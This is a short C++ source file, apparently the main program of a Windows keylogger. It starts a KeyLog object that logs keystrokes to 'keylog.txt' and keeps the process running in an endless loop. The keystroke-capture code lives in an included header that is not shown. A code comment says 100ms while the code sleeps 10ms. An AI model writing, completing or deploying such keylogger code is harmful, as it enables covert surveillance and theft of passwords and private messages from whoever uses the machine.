#include <iostream>
#include <windows.h>

#include "../include/Keylog.h"

[[noreturn]] int main() {
    std::cout << "Keylogger Starting" << std::endl;

  KeyLog keylogger( "keylog.txt");
  keylogger.start();
  // keeping the thread active
  while (true) {
    // Sleep for 100ms
    Sleep(10);
  }
}
